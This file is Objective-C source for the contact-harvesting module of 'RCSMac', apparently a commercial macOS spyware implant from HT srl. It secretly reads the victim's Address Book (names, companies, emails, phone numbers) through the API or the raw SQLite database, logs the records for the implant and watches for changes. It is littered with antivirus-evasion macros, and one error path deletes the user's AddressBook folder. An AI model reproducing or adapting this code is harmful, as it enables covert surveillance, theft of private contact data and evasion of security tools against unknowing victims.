/*
 * RCSMac - Organizer agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/11/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import <sqlite3.h>

#import "RCSMAgentOrganizer.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define AB_PK_FILE @"./389p55"

static __m_MAgentOrganizer *sharedAgentOrganizer = nil;

@interface __m_MAgentOrganizer (private)

//
// Grab all contacts available on AB
//
- (BOOL)_grabAllContacts;

//
// Callback for ABDatabaseChangedNotification
//
- (void)_ABChangedCallback: (NSNotification *)aNotification;

//
// Serialize the object for logging
//
- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord;

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType;

//
// Write down the log data
// Can be a single contact or a list
//
- (BOOL)_logData: (NSMutableData *)aLogData;

@end

@implementation __m_MAgentOrganizer (private)

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType
{
  if (aRecordData == nil)
    return nil;
  
  u_int elemSize = [aRecordData length];
  NSMutableData *singleElement = [NSMutableData new];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // This should be tag-1b -- len-3b (1dword)
  //
  u_int tag = aType << 24;
  tag |= (elemSize & 0x00FFFFFF);
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [singleElement appendBytes: &tag
                      length: sizeof(u_int)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [singleElement appendData: aRecordData];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  return [singleElement autorelease];
}

- (BOOL)_logData: (NSMutableData *)aLogData
{
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  if ([logManager createLog: AGENT_ORGANIZER
                agentHeader: nil
                  withLogID: 0] == FALSE)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return FALSE;
    }
  
  if ([logManager writeDataToLog: aLogData
                        forAgent: AGENT_ORGANIZER
                       withLogID: 0] == FALSE)
      {        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        return FALSE;
      }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logManager closeActiveLog: AGENT_ORGANIZER
                   withLogID: 0];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  return YES;
}

- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
{ 
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *contactLog     = [NSMutableData new];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // First Name
  if ([aRecord valueForProperty: kABFirstNameProperty])
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSString *element   = [aRecord valueForProperty: kABFirstNameProperty];
    NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                     withType: FirstName];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [serializedData retain];   
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [contactLog appendData: serializedData];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [serializedData release];
    
    
    // AV evasion: only on release build
    AV_GARBAGE_007
  }
  
  // Last Name
  if ([aRecord valueForProperty: kABLastNameProperty])
  {
    NSString *element   = [aRecord valueForProperty: kABLastNameProperty];
    NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                     withType: LastName];
    [serializedData retain];
    [contactLog appendData: serializedData]; 
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [serializedData release];
  }
  
  // Company Name
  if ([aRecord valueForProperty: kABOrganizationProperty])
  {
    NSString *element   = [aRecord valueForProperty: kABOrganizationProperty];
    NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                     withType: CompanyName];
    [serializedData retain];
    [contactLog appendData: serializedData];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [serializedData release];
  }
  
  // Email Address
  // MultiValue
  if ([aRecord valueForProperty: kABEmailProperty])
  {    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    ABMultiValue *email = [aRecord valueForProperty: kABEmailProperty];
    int i = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    for (i = 0; i < [email count]; i++)
    {
      //
      // Grab at max 3 email addresses
      //
      if (i == 3)
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        break;
      }
      
      NSString *element       = [email valueAtIndex: i];
      NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      uint32_t type           = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      switch (i)
      {
        case 0:
          type = Email1Address;
          break;
        case 1:
          type = Email2Address;
          break;
        case 2:
          type = Email3Address;
          break;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      NSData *serializedData  = [self _serializeSingleRecordData: recordData
                                                        withType: type];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      [serializedData retain];   
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      [contactLog appendData: serializedData];
      [serializedData release];
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Phone
  // MultiValue
  if ([aRecord valueForProperty: kABPhoneProperty])
  {
    ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
    int i = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    for (i = 0; i < [phone count]; i++)
    {
      //
      // Grab at max 3 email addresses
      //   
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if (i == 3)
      {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        break;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      NSString *element       = [phone valueAtIndex: i];
      NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      uint32_t type           = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
      {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        type = MobileTelephoneNumber;
      }
      else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
      {
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        type = BusinessTelephoneNumber;
      }
      else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
      {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        type = HomeTelephoneNumber;
      }
      else
      {   
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        // Forcing home telephone number just in case
        type = HomeTelephoneNumber;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      NSData *serializedData  = [self _serializeSingleRecordData: recordData
                                                        withType: type];  
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [serializedData retain];
      [contactLog appendData: serializedData];
      [serializedData release];
    }
  }
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return [contactLog autorelease];
}

- (void)savePk
{
  NSString *tmpZpkString = [NSString stringWithFormat:@"%d", mZ_Pk];
  [tmpZpkString writeToFile:AB_PK_FILE atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

- (NSMutableData*)_getPhoneWithId:(NSInteger)theId usingDb:(sqlite3*)db
{
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0;
  char          *szErr;
  char          **result;
  char          sql_query_all[] = "select ZFULLNUMBER from ZABCDPHONENUMBER ";
  
  NSMutableData *phoneData = nil;
  
  sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
  
  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
  
  if (ret != SQLITE_OK)
    return nil;
  
  if (ncol * nrow > 0)
  {
    phoneData = [NSMutableData dataWithCapacity:0];
    
    for (int i = 0; i< nrow * ncol; i += 1)
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      if (result[ncol + i] != NULL)
      {
        NSString *phone    = [NSString stringWithUTF8String: result[ncol + i]];
        NSData *dataPhone  = [phone  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        
        NSData *serializedPhoneData = [self _serializeSingleRecordData: dataPhone
                                                              withType: MobileTelephoneNumber];
        
        [phoneData appendData: serializedPhoneData];
      }
      
      [inner release];
    }
    
    sqlite3_free_table(result);
  }
  
  return phoneData;
}

- (NSData*)_getMailWithId:(NSInteger)theId usingDb:(sqlite3*)db
{
  NSMutableData *mailData = nil;
  
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0;
  char          *szErr;
  char          **result;
  char          sql_query_all[] = "select ZADDRESSfrom ZABCDMAILADDRESS";
  
  sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);

  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
  
  if (ret != SQLITE_OK)
    return nil;
  
  if (ncol * nrow > 0)
  {
    mailData = [NSMutableData dataWithCapacity:0];
    
    for (int i = 0; i< nrow * ncol; i += 1)
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      if (result[ncol + i] != NULL)
      {
        NSString *mail     = [NSString stringWithUTF8String: result[ncol + i]];
        NSData *_mailData  = [mail  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        
        NSData *serializedPhoneData = [self _serializeSingleRecordData: _mailData
                                                              withType: Email1Address];
        
        [mailData appendData: serializedPhoneData];
      }
      
      [inner release];
    }
    
    sqlite3_free_table(result);
  }

  return mailData;
}

- (const char*)getDBPath
{
  NSString *myPath = [NSString stringWithFormat:@"%@/../../Application Support/AddressBook/AddressBook-v22.abcddb",
                                                [[NSBundle mainBundle]bundlePath]];
  
  return [myPath cStringUsingEncoding:NSUTF8StringEncoding];
}

- (NSData*)createLogHeaderWithSize:(NSInteger)logSize
{
  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  additionalHeader->size    = sizeof(organizerAdditionalHeader) + logSize;
  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  additionalHeader->identifier  = 0;
  additionalHeader->program     = 0x01; // phone contact
  additionalHeader->flags       = 0x00000000; // non local (local = 0x80000000)
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return [logHeader autorelease];
}

- (void)_getABcontacts
{
  int           z_pk;
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0;
  char          *szErr;
  char          **result;
  sqlite3       *db;
  char          sql_query_all[] = "select Z_PK, ZFIRSTNAME, ZLASTNAME from ZABCDRECORD ";
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *logData = nil;
  
  sprintf(sql_query_curr, "%s where Z_PK > %d", sql_query_all, mZ_Pk);
  
  if (sqlite3_open([self getDBPath], &db))
  {
    sqlite3_close(db);
    [pool release];
    return;
  }
  
  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
  
  if (ret != SQLITE_OK)
  {
    sqlite3_close(db);
    [pool release];
    return;
  }
  
  if (ncol * nrow > 0)
  {
    logData = [NSMutableData dataWithCapacity:0];
    
    for (int i = 0; i< nrow * ncol; i += 3)
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      NSString *first = nil;
      NSString *last  = nil;
      
      NSMutableData *contentLog = [NSMutableData dataWithCapacity:0];
      
      sscanf(result[ncol + i], "%ld", (long*)&z_pk);
      
      if (result[ncol + i + 1] != NULL)
      {
        first   = [NSString stringWithUTF8String: result[ncol + i + 1]];
        NSData *firstData = [first dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        
        NSData *serializedFirstData = [self _serializeSingleRecordData: firstData
                                                              withType: FirstName];
        
        if (serializedFirstData != nil)
          [contentLog appendData: serializedFirstData];
      }
      
      if (result[ncol + i + 2] != NULL)
      {
        last = [NSString stringWithUTF8String: result[ncol + i + 2]];
        
        NSData *lastData  = [last  dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
        
        NSData *serializedLastData  = [self _serializeSingleRecordData: lastData
                                                              withType: LastName];
        
        if (serializedLastData != nil)
          [contentLog appendData: serializedLastData];
      }     
      
      if (first != nil || last != nil)
      {
        NSData *serializedPhoneData = [self _getPhoneWithId:z_pk usingDb:db];
        
        if (serializedPhoneData != nil)
          [contentLog appendData: serializedPhoneData];
        
        NSData *serializedMailData  = [self _getMailWithId:z_pk usingDb:db];

        if (serializedMailData != nil)
          [contentLog appendData: serializedMailData];
        
        NSData *headerData = [self createLogHeaderWithSize:[contentLog length]];
        
        mZ_Pk = z_pk;
        
        [logData appendData:headerData];
        [logData appendData: contentLog];
      }
      
      [inner release];
    }
    
    sqlite3_free_table(result);
  }
  
  sqlite3_close(db);
  
  [self _logData: logData];
  
  [self savePk];
  
  [pool release];
  
  return;
}

- (BOOL)_grabAllContacts
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSArray *allPeople;

  @try
  {
    allPeople = [[ABAddressBook sharedAddressBook] people];
  }
  @catch (NSException *e)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_000   
    
    NSString *abPath = [NSString stringWithFormat:
                        @"%@/Library/Application Support/AddressBook",
                        NSHomeDirectory()];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
    NSArray *arguments = [NSArray arrayWithObjects:
                          @"-R",
                          userAndGroup,
                          abPath,
                          nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [gUtil executeTask: @"/usr/sbin/chown"
         withArguments: arguments
          waitUntilEnd: YES];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    // Remove it so that hopefully somebody will create it in the proper way
    [[NSFileManager defaultManager] removeItemAtPath: abPath
                                               error: nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    return NO;
  }
 
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSMutableData *logData = [NSMutableData new];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  for (ABRecord *record in allPeople)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    NSMutableData *logHeader      = [[NSMutableData alloc]
                                     initWithLength: sizeof(organizerAdditionalHeader)];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSData *contactLog = [self _prepareContactForLogging: record];
    [contactLog retain];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    u_int blockSize = sizeof(organizerAdditionalHeader) + [contactLog length];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    additionalHeader->size        = blockSize;
    additionalHeader->version     = CONTACT_LOG_VERSION_NEW;

    // AV evasion: only on release build
    AV_GARBAGE_006
    
    additionalHeader->identifier  = 0;
    additionalHeader->program     = 0x01; // phone contact
    additionalHeader->flags       = 0x00000000; // non local (local = 0x80000000)
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [logData appendData: logHeader];
    [logData appendData: contactLog];
    
    [contactLog release];
    [innerPool release];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [self _logData: logData];
  [logData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (void)_ABChangedCallback: (NSNotification *)aNotification
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  int i = 0;
  
  // Check first for inserted records
  NSArray *entries = [[aNotification userInfo] objectForKey: kABInsertedRecords];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (entries == nil)
  {
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    // Check for updated records
    entries = [[aNotification userInfo] objectForKey: kABUpdatedRecords];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (entries == nil)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    // We return from here since we're not interested in records deletion
    [outerPool release];
    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  for (i = 0; i < [entries count]; i++)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    NSString *uniqueID = [entries objectAtIndex: i];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    ABRecord *record = [[ABAddressBook addressBook] recordForUniqueId: uniqueID];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSMutableData *logData        = [NSMutableData new];
    NSMutableData *logHeader      = [[NSMutableData alloc]
                                     initWithLength: sizeof(organizerAdditionalHeader)];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    NSData *contactLog = [self _prepareContactForLogging: record];
    [contactLog retain];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    u_int blockSize = sizeof(organizerAdditionalHeader)
    + [contactLog length];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    additionalHeader->size        = blockSize;
    additionalHeader->version     = CONTACT_LOG_VERSION; 
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    additionalHeader->identifier  = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [logData appendData: logHeader];   
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [logData appendData: contactLog];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [self _logData: logData];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [contactLog release];
    [logHeader release];
    [logData release];
    
    [innerPool release];
  }
  
  [outerPool release];
}

- (void)_getABcontactsTimer:(NSTimer*)theTimer
{
  [self _getABcontacts];
}

@end


@implementation __m_MAgentOrganizer

//@synthesize mConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentOrganizer *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentOrganizer;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        sharedAgentOrganizer = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentOrganizer;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (id)autorelease
{
  return self;
}

- (void)release
{
  // Do nothing
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)stop
{
  int internalCounter = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [mConfiguration setObject: AGENT_STOP
                     forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOPPED]
         && internalCounter <= MAX_STOP_WAIT_TIME)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    internalCounter++;
    usleep(100000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  NSTimer *timer = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (gOSMajor == 10 && gOSMinor >= 8)
  {
    NSString *zpkString = [NSString stringWithContentsOfFile:AB_PK_FILE
                                                    encoding:NSUTF8StringEncoding
                                                       error:nil];
    mZ_Pk = [zpkString integerValue];
    
    timer  = [NSTimer scheduledTimerWithTimeInterval:10
                                              target:self
                                            selector:@selector(_getABcontactsTimer:)
                                            userInfo:nil
                                             repeats:YES];

    [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
  }
  else
  {
    //
    // Register our observer in order to grab notifications about changes
    // NOTE: kABDatabaseChangedExternallyNotification on NSNotificationCenter
    // doesn't seem to work
    //
    // On Distributed Notification Center
    // - @"ABDatabaseChangedNotification"
    // - @"ABDatabaseChangedNotificationPriv" (sent always two times)
    //
    [[NSDistributedNotificationCenter defaultCenter] addObserver:self
                                                        selector:@selector(_ABChangedCallback:)
                                                            name:@"ABDatabaseChangedNotification"
                                                          object:nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    // First off, grab all contacts
    if ([self _grabAllContacts] == NO)
      [mConfiguration setObject: AGENT_STOP forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
  }
  
  NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
  
  while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
         && ![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOPPED])
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
    
      if (gOSMajor == 10 && gOSMinor >= 8)
        [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
      else
        sleep(1);
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      [inner release];
    }

  if (gOSMajor == 10 && gOSMinor >= 8)
  {
    if (timer != nil)
      [timer invalidate];
  }
  else
  {
    // Remove our observer
    [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
  }
  
  if ([[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOP])
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      [mConfiguration setObject: AGENT_STOPPED
                         forKey: @"status"];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [outerPool release]; 
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (aConfiguration != mConfiguration)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      [mConfiguration release]; 
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      mConfiguration = [aConfiguration retain];
    }
}


@end
